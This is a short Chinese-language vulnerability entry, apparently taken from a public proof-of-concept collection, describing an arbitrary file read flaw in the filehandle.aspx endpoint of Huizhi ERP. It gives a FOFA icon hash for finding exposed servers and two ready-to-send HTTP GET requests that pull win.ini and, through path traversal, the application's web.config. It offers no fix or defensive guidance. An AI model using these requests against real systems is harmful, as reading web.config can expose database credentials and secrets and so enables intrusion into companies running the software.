# 汇智ERP filehandle存在任意文件读取漏洞

# 一、漏洞简介
汇智ERP是一款由江阴汇智软件技术有限公司开发的企业资源规划（ERP）软件，旨在通过信息化手段帮助企业优化业务流程，提升管理效率，增强综合竞争力。适用于各类企业，包括大型企业、中小型企业以及集团化企业。根据企业规模和业务需求，汇智ERP提供了不同的版本（如集团版和标准版），以满足企业的个性化需求。汇智ERP filehandle存在任意文件读取漏洞

# 二、影响版本
+ 汇智ERP

# 三、资产测绘
+ fofa`icon_hash="-642591392"`
+ 特征


# 四、漏洞复现
```plain
GET /nssys/common/filehandle.aspx?filepath=C%3a%2fwindows%2fwin%2eini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```


```plain
GET /nssys/common/filehandle.aspx?filepath=../../web.config HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rpkrxscac0dp5hda>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
